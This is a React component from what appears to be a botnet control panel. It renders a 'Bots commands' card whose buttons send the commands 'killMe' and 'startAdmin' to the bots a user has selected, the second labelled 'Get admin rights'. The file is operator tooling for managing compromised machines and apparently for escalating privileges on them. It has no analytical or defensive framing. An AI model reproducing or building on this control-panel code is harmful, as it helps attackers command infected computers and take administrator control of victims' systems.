import React from 'react';
import SettingsContext from '../../Settings';


//{"name":"killMe"}
class BOTKILL extends React.Component {

    constructor(props) {
        super(props);
    }

    onClickKILL = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"name":"killMe"}');
            SettingsContext.ShowToast("success", "Send command to kill selected bots");
        }
    }

    onClickAdminrights = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"name":"startAdmin"}');
            SettingsContext.ShowToast("success", "Send command to get admin rights");
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Bots commantds</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Send other commands to selected bots</h6>
                    <button type="button" onClick={this.onClickKILL} class="btn btn-right btn-outline-danger">KILL BOTS</button>
                    <button type="button" onClick={this.onClickAdminrights} class="btn btn-left btn-outline-warning">Get admin rights</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default BOTKILL;